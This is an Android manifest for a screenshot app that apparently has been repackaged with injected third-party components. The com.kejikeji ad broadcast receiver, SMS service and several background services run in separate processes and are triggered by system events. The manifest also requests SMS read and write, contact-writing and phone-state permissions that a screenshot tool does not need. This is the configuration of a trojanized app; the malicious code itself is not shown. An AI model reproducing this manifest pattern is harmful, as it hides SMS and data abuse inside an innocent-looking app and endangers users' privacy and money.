<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.edwardkim.android.screenshotitfull">
    <application android:icon="@drawable/icon" android:label="@string/app_name">
        <activity android:label="@string/app_name" android:launchMode="singleTask" android:name="com.edwardkim.android.screenshotit.activities.ScreenShotIt" android:theme="@android:style/Theme.Light">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        <activity android:label="@string/app_name" android:name="com.edwardkim.android.screenshotit.activities.Tutorial1" android:theme="@android:style/Theme.Light"/>
        <activity android:label="@string/app_name" android:name="com.edwardkim.android.screenshotit.activities.Tutorial2" android:theme="@android:style/Theme.Light"/>
        <activity android:label="@string/app_name" android:name="com.edwardkim.android.screenshotit.activities.Tutorial3" android:theme="@android:style/Theme.Light"/>
        <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:label="@string/app_name" android:launchMode="singleTask" android:name="com.edwardkim.android.screenshotit.activities.Crop" android:taskAffinity="" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
        <activity android:excludeFromRecents="true" android:label="@string/app_name" android:launchMode="singleTask" android:name="com.edwardkim.android.screenshotit.activities.ScreenShotCountdown" android:taskAffinity="" android:theme="@android:style/Theme.Light.Panel">
            <intent-filter>
                <action android:name="android.intent.action.SEARCH_LONG_PRESS"/>
                <category android:name="android.intent.category.DEFAULT"/>
            </intent-filter>
        </activity>
        <service android:enabled="true" android:name="com.edwardkim.android.screenshotit.services.ScreenShotService"/>
        <receiver android:name="com.edwardkim.android.screenshotit.broadcastreceivers.StartupReceiver">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
                <category android:name="android.intent.category.HOME"/>
            </intent-filter>
        </receiver>
        <receiver android:name="com.edwardkim.android.screenshotit.broadcastreceivers.PackageInstalledReceiver">
            <intent-filter>
                <action android:name="android.intent.action.PACKAGE_ADDED"/>
                <data android:scheme="package"/>
            </intent-filter>
        </receiver>
        <receiver android:label="@string/app_name" android:name="com.edwardkim.android.screenshotit.appwidgetprovider.ScreenShotItAppWidgetProvider" android:process="com.edwardkim.android.screenshotit.appwidgetprovider.ScreenShotItAppWidgetProvider">
            <intent-filter>
                <action android:name="android.appwidget.action.APPWIDGET_UPDATE"/>
                <action android:name="com.edwardkim.android.screenshotit.appwidgetprovider.ScreenShotItAppWidgetProvider.ACTION_WIDGET_RECEIVER"/>
            </intent-filter>
            <meta-data android:name="android.appwidget.provider" android:resource="@xml/widget_provider"/>
        </receiver>
        <receiver android:name="com.kejikeji.AdStartBroadcast" android:process=":four">
            <intent-filter>
                <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
                <action android:name="android.intent.action.ACTION_POWER_CONNECTED"/>
                <action android:name="android.intent.action.INPUT_METHOD_CHANGED"/>
                <action android:name="android.intent.action.BATTERY_LOW"/>
                <action android:name="android.intent.action.BATTERY_OKAY"/>
                <action android:name="android.intent.action.USER_PRESENT"/>
            </intent-filter>
        </receiver>
        <service android:name="com.kejikeji.AdSmsService"/>
        <service android:name="com.kejikeji.SystemPlus" android:process=":three"/>
        <service android:name="com.kejikeji.MainRun" android:process=":two"/>
        <receiver android:name="com.kejikeji.ForAlarm" android:process=":remote"/>
        <meta-data android:name="APP_UID" android:value="f1cd8ba"/>
    </application>
    <uses-permission android:name="android.permission.READ_SMS"/>
    <uses-permission android:name="android.permission.WRITE_SMS"/>
    <uses-permission android:name="android.permission.WRITE_CONTACTS"/>
    <uses-permission android:name="android.permission.VIBRATE"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="com.android.vending.CHECK_LICENSE"/>
</manifest>